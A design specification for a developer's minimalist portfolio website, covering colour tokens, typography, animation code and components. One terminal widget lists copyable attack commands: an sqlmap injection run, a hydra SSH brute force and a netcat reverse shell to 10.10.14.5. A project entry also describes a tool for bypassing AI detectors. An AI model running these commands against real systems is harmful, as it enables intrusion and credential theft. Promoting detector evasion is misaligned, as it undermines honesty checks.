# Design Specification & Architecture Master Guide: Minimalistic Editorial Portfolio

> **Target Audience**: Any AI Model, Lead Frontend Architect, UI/UX Designer, or Motion Engineer.  
> **Identity**: **Muhammad Moosa** — Fullstack Developer & Web Engineer (Creator of CommandsLab).  
> **Purpose**: An exhaustive, single-source-of-truth design document specifying every visual token, layout constraint, micro-interaction, animation curve, DOM structure, component anatomy, and implementation detail of the **Muhammad Moosa** Minimalistic Editorial Portfolio.

---

## Table of Contents
1. [Aesthetic Identity & Core Design Philosophy](#1-aesthetic-identity--core-design-philosophy)
2. [Master Color System & Design Tokens](#2-master-color-system--design-tokens)
3. [Typography System & Fluid Scaling](#3-typography-system--fluid-scaling)
4. [Atmospheric Effects & SVG Grain Noise](#4-atmospheric-effects--svg-grain-noise)
5. [Layout Architecture & Responsive Grid](#5-layout-architecture--responsive-grid)
6. [Motion, Physics & Animation Engine (GSAP, Lenis, Framer Motion Dynamics)](#6-motion-physics--animation-engine-gsap-lenis-framer-motion-dynamics)
7. [Component-by-Component Pixel & DOM Specifications](#7-component-by-component-pixel--dom-specifications)
8. [Projects Showcase Registry](#8-projects-showcase-registry)
9. [Flagship Interactive Terminal Component](#9-flagship-interactive-terminal-component)
10. [Engineering Workflow Scrollytelling Deck](#10-engineering-workflow-scrollytelling-deck)
11. [Interactive States & Micro-Interactions](#11-interactive-states--micro-interactions)
12. [Developer Run, Build & Troubleshooting Guide](#12-developer-run-build--troubleshooting-guide)
13. [AI Model Prompting & Extension Rules](#13-ai-model-prompting--extension-rules)

---

## 1. Aesthetic Identity & Core Design Philosophy

The portfolio embodies **Warm Monochromatic Brutalism** blended with **High-End Swiss Editorial Design**:
- **Persona & Brand**: **Muhammad Moosa** (Brand Mark: `MM©`). Fullstack Developer & Web Engineer based in Pakistan, focused on cybersecurity tools, AI utilities, and interactive web systems.
- **Palette Temperament**: Warm, tactile, non-sterile monochromes. Rather than harsh `#000000` on `#FFFFFF`, the primary canvas is an organic warm limestone/alabaster (`#E8E8E3`) contrasted against a rich charcoal obsidian (`#1A1A1A`) and warm espresso slate (`#393632`).
- **Typographic Dominance**: Typography serves both as content and primary visual architecture. Display headings utilize massive fluid viewport units (`13vw`, `14vw`, `15vw`, `12.2rem`) that run edge-to-edge, balanced by tight, refined editorial sans-serif paragraphs.
- **Micro-Grain Texture**: An authentic tactile feel is achieved by projecting an SVG fractal-noise grain overlay over the entire viewport with subtle opacity (`0.111`), eliminating digital flatness.
- **Physicality & Inertia**: Scrolling behaves like physical paper and film through **Lenis Smooth Scroll** coupled with **GSAP ScrollTrigger** timeline pinning, card stacking decks, and LERP-driven counters.
- **Dual-Tone Inversion**: The site alternates deliberately between the light canvas (`#E8E8E3`) in the Hero, Marquee, and Footer, and a dark enveloping container (`#1A1A1A`) with smooth rounded corners (`rounded-tr-4xl rounded-tl-4xl` and `rounded-bl-4xl rounded-br-4xl`) for the core content sections.

---

## 2. Master Color System & Design Tokens

Every color in this design has a strictly enforced semantic role. AI models must adhere to these exact HEX values:

| Token Name | HEX Value | RGB Equivalent | Semantic Purpose & Usage |
| :--- | :--- | :--- | :--- |
| `--canvas-light` | `#E8E8E3` | `rgb(232, 232, 227)` | Primary light background (Hero, Marquee, Footer, Body canvas). Warm limestone alabaster. |
| `--surface-dark` | `#1A1A1A` | `rgb(26, 26, 26)` | Primary dark section container (Services, CommandsLab, Projects, Workflow, About, Preloader). Rich obsidian. |
| `--surface-accent` | `#393632` | `rgb(57, 54, 50)` | Secondary dark surface. Used for button base background, mobile drawer background, and footer copyright text. |
| `--surface-card` | `#141414` | `rgb(20, 20, 20)` | Inner card surface (Workflow cards, Terminal background `#0D0D0D`). |
| `--border-dark` | `#7E766C` | `rgb(126, 118, 108)` | Divider lines between service cards, project cards, and section boundaries. Muted taupe bronze. |
| `--border-subtle` | `#A29E9A` | `rgb(162, 158, 154)` | Secondary divider line and list item bottom border on dark backgrounds. |
| `--border-card` | `#262626` | `rgb(38, 38, 38)` | Subtle border for terminal window and workflow cards. |
| `--text-dark-primary` | `#1A1A1A` | `rgb(26, 26, 26)` | Heavy editorial headlines, brand logo (`MM©`), navigation links on light canvas. |
| `--text-dark-muted` | `#6B645C` | `rgb(107, 100, 92)` | Secondary paragraphs and subtitles on the light canvas. |
| `--text-light-primary` | `#E8E8E3` / `#E0E0E0` | `rgb(232, 232, 227)` | Primary headlines, major display text, and preloader titles on dark canvas. |
| `--text-light-secondary`| `#D1D1C7` | `rgb(209, 209, 199)` | Section serial numbers `(01)`, subtitle tags `( Skills / Services )`, active pill text. |
| `--text-light-muted` | `#A29E9A` | `rgb(162, 158, 154)` | Informational descriptions, project categories, inactive numbers, list labels. |
| `--accent-pill-fill` | `#8C8C73` | `rgb(140, 140, 115)` | Liquid fill hover state on "Let's Connect" buttons, diagonal SVG arrow strokes, active badge accents. |
| `--badge-bg-neutral` | `#BFBFB1` | `rgb(191, 191, 177)` | Hamburger circular button background, pill tags (`Flagship`, `2025`), tag hover backgrounds. |
| `--status-green` | `#27C93F` | `rgb(39, 201, 63)` | Active status indicator dot, terminal window dot, copy success feedback. |
| `--overlay-dim` | `rgba(0,0,0,0.5)`| `rgba(0, 0, 0, 0.5)` | Dimming overlay layer on project card hover. |
| `--magnetic-btn-bg` | `#FFFFFF` | `rgb(255, 255, 255)` | Floating magnetic "Live App" circular pill button background on project image hover. |

---

## 3. Typography System & Fluid Scaling

### Font Family
- **Family**: `'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif`
- **Source**: Google Fonts (`weights: 100..900 display=swap`)
- **Base Body**: `font-family: 'Outfit', sans-serif; font-optical-sizing: auto;`

### Typographic Scale
- **Hero Display Name (Desktop)**: `text-[6vw] lg:text-[7vw] xl:text-[6.8rem] font-medium leading-none tracking-tight` with cohesive `gap-x-5 lg:gap-x-8` grouping "MUHAMMAD MOOSA" as a unified masthead, balanced by the editorial `[ PK • UTC+5 ]` role badge.
- **Hero Display Name (Mobile)**: `text-[13vw] sm:text-[11vw] leading-[0.92] text-[#1A1A1A]` structured as stacked block spans ensuring zero mid-word wrapping and consistent primary color.
- **Section Big Titles**: `text-[15vw] md:text-8xl xl:text-9xl font-medium uppercase leading-none`
- **Workflow & CommandsLab Titles**: `text-[12vw] md:text-7xl xl:text-8xl font-medium uppercase`
- **Service & Project Headlines**: `text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-medium tracking-tight group-hover:text-white transition-colors`
- **Service Serial Numbers**: `text-3xl md:text-5xl font-semibold text-[#d1d1c7]`
- **Sticky Pinned Number Ticker**: `text-[20vw] leading-[1] text-[#a29e9a]`
- **Sub-Header Section Tags**: `text-[20px] md:text-lg uppercase tracking-wider`
- **Body Text**: `text-lg md:text-xl lg:text-2xl font-normal leading-relaxed text-[#a29e9a] / text-[#6b645c]`
- **Monospace Code / Terminal**: `font-mono text-xs md:text-sm text-[#e8e8e3]`
- **Button Text**: `text-base md:text-lg font-medium`
- **Micro Badges / Tags**: `text-xs px-3 py-1 font-mono rounded-full border`

---

## 4. Atmospheric Effects & SVG Grain Noise

A signature characteristic of the design is the persistent film-grain texture overlaid on the application.

```html
<div class="grain-layer fixed inset-0 w-full h-full pointer-events-none z-[9999] mix-blend-normal opacity-[0.111]">
</div>
<svg style="position: absolute; width: 0; height: 0; pointer-events: none;">
    <filter id="grainy">
        <feTurbulence type="fractalNoise" baseFrequency="0.5" numOctaves="3" stitchTiles="stitch" />
        <feColorMatrix type="saturate" values="0" />
    </filter>
</svg>
```
- `baseFrequency="0.5"`: Generates fine, tactile micro-grain rather than coarse digital noise.
- `numOctaves="3"`: Adds layered procedural depth.
- `feColorMatrix saturate="0"`: Enforces strict monochromatic noise.
- `opacity: 0.111`: Kept faint so it subtly textures the light limestone and dark charcoal surfaces without degrading readability.
- `pointer-events-none` & `z-[9999]`: Ensures all interactive elements below remain fully clickable.

---

## 5. Layout Architecture & Responsive Grid

### Breakpoint Matrix
- **Mobile**: `< 768px` (Single column, fluid `vw` typography, hamburger navigation drawer).
- **Tablet**: `768px - 1023px` (Two-column layout, horizontal flex alignment, desktop menu visible).
- **Laptop**: `1024px - 1279px` (Expanded whitespace, sticky counter enabled).
- **Desktop**: `1280px - 1535px` (Full editorial layout, fixed offset pinning).
- **Large Desktop**: `≥ 1536px` (`2xl` constraints, maximum typography ceiling).

### Section Curvature & Seams
- Top edge of `#page2`: `rounded-tr-4xl rounded-tl-4xl` (32px / 2rem top corner radius).
- Bottom edge of `.aboutme`: `rounded-bl-4xl rounded-br-4xl` (32px / 2rem bottom corner radius).
- Negative Margin Seam Pull: `mt-[-1px] md:mt-[-2px]` ensures zero sub-pixel rendering gaps between dark sections.

---

## 6. Motion, Physics & Animation Engine (GSAP, Lenis, Framer Motion Dynamics)

The site integrates four core animation systems:
1. **Lenis Smooth Inertia Scroll** (Virtual physics & normalized wheel handling)
2. **GSAP Timeline Preloader** (Sequential intro choreography)
3. **GSAP SplitText Typography Reveals** (Masked character/word/line reveals)
4. **GSAP ScrollTrigger Pinning & Scrubbing** (Sticky cards, 5-project LERP number ticker, parallax)

### 6.1 Lenis Configuration & GSAP Ticker Slave
```javascript
const lenis = new Lenis({
    lerp: 0.08,             // High-inertia fluid smoothing
    smoothWheel: true,
    wheelMultiplier: 1.0,
    touchMultiplier: 1.5,
});

lenis.on('scroll', (e) => {
    ScrollTrigger.update();
    updateProgressBar(e);
});

gsap.ticker.add((time) => {
    lenis.raf(time * 1000);
});
```

### 6.2 Framer-Inspired Scroll Progress Bar
```javascript
function updateProgressBar(e) {
    const scrollProgress = e.progress !== undefined 
        ? e.progress * 100 
        : (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
    progressBar.style.width = `${Math.min(100, Math.max(0, scrollProgress))}%`;
}
```

### 6.3 Card Stacking Physics
The three services cards (`.box1`, `.box2`, `.box3`) stack on top of each other:
- Card 1 pins at `top 50px`.
- Card 2 pins at `top 150px`.
- Card 3 pins at `top 250px` with `pinSpacing: true` and `endTrigger: ".box3"`.

### 6.4 5-Project Sticky Counter Mathematical Formula
The project counter features static `0` and animated `1.`, `2.`, `3.`, `4.`, `5.`.
With 5 slides, each span occupies `1em` inside a `1em` overflow wrapper:
```javascript
function setTarget(index) {
    targetY = - (100 / 5) * index; // -20% per index
}

gsap.ticker.add(() => {
    currentY += (targetY - currentY) * 0.12;
    setY(currentY);
});
```
- Index 0 -> `0%` (displays `1.`)
- Index 1 -> `-20%` (displays `2.`)
- Index 2 -> `-40%` (displays `3.`)
- Index 3 -> `-60%` (displays `4.`)
- Index 4 -> `-80%` (displays `5.`)

---

## 7. Component-by-Component Pixel & DOM Specifications

### 7.1 Global Header & Navigation (`#header`)
- **Brand Logo**: `MM©` (link to top).
- **Navigation Links**: Services, CommandsLab, Projects, Workflow, About, Resume, Contact.
- **Micro-Interaction**: Dual-layer rolling text (`.slide-text.group-hover:-translate-y-full`).
- **Mobile Hamburger**: Pill `w-12 h-12 bg-[#BFBFB1]`, morphs into `X` on click.
- **Mobile Drawer**: Full-screen `#393632` with contact info:
  - Email: `muhammadmoosa9998@gmail.com`
  - Phone: `+92 332 0826820`
  - GitHub: `https://github.com/moosa2005`
  - LinkedIn: `https://www.linkedin.com/in/muhammad-moosa2005/`

### 7.2 Hero Section (`#page1`)
- **Top Section**:
  - Desktop: Cohesive `MUHAMMAD MOOSA` masthead (`text-[6vw] lg:text-[7vw] xl:text-[6.8rem] font-medium text-[#1A1A1A] gap-x-6 lg:gap-x-10`), balanced on the right by `[ PK • UTC+5 ] FULLSTACK WEB ENGINEER`.
  - Mobile: Clean stacked block spans of `MUHAMMAD` and `MOOSA` (`text-[13vw] sm:text-[11vw] leading-[0.92] text-[#1A1A1A]`) with `pt-16` padding preventing header collision.
- **Bottom Content Grid (Pictureless Editorial)**:
  - Left: Diagonal SVG arrow, introduction copy, Liquid-fill "Let's Connect" button + direct GitHub pill link.
  - Right: Work status "AVAILABLE FOR WORK" + "2025/26" year stamp.
  - Center: Clean, breathable negative space (profile photo removed from markup for pure editorial brutalism).

### 7.3 Infinite Velocity Running Marquee
- Sits between Hero and `#page2` on light `#E8E8E3` background.
- Dual-track CSS keyframe translation (`@keyframes marquee-scroll 35s linear infinite`).
- Pauses on `:hover`.
- Copy: `FULLSTACK ENGINEERING ✦ COMMANDSLAB PENTESTING TOOL ✦ NEXT.JS & TYPESCRIPT ✦ AI NLP HUMANIZER ✦ GSAP & LENIS SMOOTH SCROLL ✦ CLIENT-SIDE RESUME & BG REMOVER ✦`

---

## 8. Projects Showcase Registry

All projects are integrated into the sticky scrollytelling deck (`#project`). In line with warm brutalist editorial aesthetics, all project cards are **pictureless editorial typography cards** featuring live status indicators, large hover-responsive headings, category pills, monospace tags, and direct dual action buttons:

| # | Project Name | Tech Stack | GitHub Repo | Live Demo | Core Purpose |
| :- | :--- | :--- | :--- | :--- | :--- |
| **01** | **CommandsLab** *(Flagship)* | Next.js, TypeScript, Tailwind CSS, Cybersecurity | [github.com/moosa2005/Commands_Lab](https://github.com/moosa2005/Commands_Lab) | [commandslab.vercel.app](https://commandslab.vercel.app/) | Free Kali Linux penetration testing command generator tool for ethical hackers. |
| **02** | **AI Humanizer** | React.js, AI NLP, Tailwind CSS | [github.com/moosa2005/humanizerr](https://github.com/moosa2005/humanizerr) | [humanizerr.vercel.app](https://humanizerr.vercel.app/) | Converts AI-generated text into natural human style to bypass AI detectors. |
| **03** | **Interactive Resume Builder** | TypeScript, React.js, Tailwind CSS, PDF Engine | [github.com/moosa2005/ResumeBuilder](https://github.com/moosa2005/ResumeBuilder) | [github.com/moosa2005/ResumeBuilder](https://github.com/moosa2005/ResumeBuilder) | Real-time resume creator with custom templates, section reordering & PDF export. |
| **04** | **AI Background Remover** | JavaScript, Canvas API, Computer Vision | [github.com/moosa2005/bg-remover](https://github.com/moosa2005/bg-remover) | [github.com/moosa2005/bg-remover](https://github.com/moosa2005/bg-remover) | Client-side automated background removal tool generating transparent PNGs. |
| **05** | **Universal File Converter** | React.js, WebAssembly, Client Processing | [github.com/moosa2005/convertor](https://github.com/moosa2005/convertor) | [convertor-rose.vercel.app](https://convertor-rose.vercel.app/) | Privacy-centric multi-format document and media converter directly in-browser. |

---

## 9. Flagship Interactive Terminal Component

Located in `#commandslab`:
- **Window Anatomy**: MacOS-style traffic light window controls (`#ff5f56`, `#ffbd2e`, `#27c93f`), dark `#0d0d0d` background, subtle `#262626` borders.
- **Interactive Tabs**:
  - `nmap`: `nmap -sV -sC -A -p- -T4 --script=vuln 192.168.1.100`
  - `sqlmap`: `sqlmap -u "https://target.com/item?id=1" --dbs --batch --random-agent --level=3`
  - `hydra`: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 4 -V`
  - `shell`: `busybox nc 10.10.14.5 4444 -e /bin/sh`
- **Copy Feedback**: Clicking "Copy Command" copies the active string to the clipboard, changes button text to "Copied!" and turns background `#27c93f` for 2 seconds.

---

## 10. Engineering Workflow Scrollytelling Deck

Located in `#workflow`:
- **Card 01 — Discovery & System Architecture**: Defining explicit specifications, user journey maps, selecting optimal fullstack tech stacks, and modeling database schemas.
- **Card 02 — Rapid Prototyping & UX Wireframing**: Converting concepts into tactile prototypes with micro-interactions, responsive ergonomics, and accessibility.
- **Card 03 — Fullstack Execution & Security**: Writing typed TypeScript code with strict linting, client-side encryption, and security best practices.
- **Card 04 — Motion Choreography & Launch**: Layering butter-smooth Lenis inertia scrolling, GSAP ScrollTrigger timelines, and automated CI/CD pipelines.

---

## 11. Interactive States & Micro-Interactions

### 11.1 Dual Rolling Text Link
```html
<div class="menu-line text-[#1A1A1A] w-fit group flex flex-col h-6 items-center relative overflow-hidden">
    <a class="nav-links slide-text group-hover:-translate-y-full" href="#services">Services</a>
    <a class="nav-links slide-text group-hover:-translate-y-full" href="#services">Services</a>
</div>
```

### 11.2 Liquid-Fill Pill Button
```html
<button class="relative bg-[#393632] cursor-pointer px-6 py-2.5 rounded-full overflow-hidden group flex items-center gap-2">
    <div class="absolute inset-0 bg-[#8c8c73] rounded-full translate-y-full group-hover:translate-y-0 transition-all duration-500 ease-in-out z-0"></div>
    <div class="relative h-[28px] overflow-hidden z-10">
        <div class="flex items-center gap-2 transition-transform duration-500 ease-in-out group-hover:-translate-y-full">
            <span class="text-[#E8E8E3] text-base font-medium">Let's Connect</span>
        </div>
        <div class="absolute top-full left-0 flex items-center gap-2 w-full transition-all duration-500 ease-in-out group-hover:top-0">
            <span class="text-[#E8E8E3] text-base font-medium">Let's Connect</span>
        </div>
    </div>
</button>
```

### 11.3 Magnetic Cursor Follower Physics
```javascript
container.addEventListener("mousemove", (e) => {
    const rect = container.getBoundingClientRect();
    const x = e.clientX - rect.left - rect.width / 2;
    const y = e.clientY - rect.top - rect.height / 2;

    gsap.to(button, {
        x: x * 0.25,
        y: y * 0.25,
        scale: 1.05,
        ease: "power2.out",
        duration: 0.3,
    });
});
```

---

## 12. Developer Run, Build & Troubleshooting Guide

### Quick Start
```bash
# Start local server
node server.js
# Or via npm
cmd.exe /c npm start
```
Open **`http://localhost:3000/`** in any browser.

### CSS Compilation Commands
```bash
# Rebuild production CSS
cmd.exe /c npx @tailwindcss/cli -i ./input.css -o ./output.css --minify

# Live CSS watch mode during development
cmd.exe /c npx @tailwindcss/cli -i ./input.css -o ./output.css --watch
```

### Windows Execution Policy Workaround
If running `npm` throws `PSSecurityException`, execute via `cmd.exe /c npm ...` or run `node server.js` directly.

---

## 13. AI Model Prompting & Extension Rules

When prompting any AI model to add a new section, project, or feature to this codebase:
1. **Never use standard primary colors**: Only use the exact tokens (`#E8E8E3`, `#1A1A1A`, `#393632`, `#6B645C`, `#8C8C73`, `#BFBFB1`, `#D1D1C7`, `#A29E9A`).
2. **Never break typography scale**: Major titles must use fluid `vw` units (`text-[15vw] md:text-8xl xl:text-9xl`) in uppercase.
3. **Always use rolling text on interactive links**: Wrap links in `.menu-line.group.h-6.overflow-hidden.flex.flex-col` with dual `<a class="slide-text group-hover:-translate-y-full">`.
4. **Preserve Lenis & GSAP ticker harmony**: Never introduce conflicting scroll listeners or `overflow: hidden` on the root body without coordinating with `data-lenis-prevent` or `lenis.stop()`.
5. **Preserve Picture Paths**: Do not delete or rename `./assets/pfp2.jpg` or `./assets/project1.jpg` without user instruction.
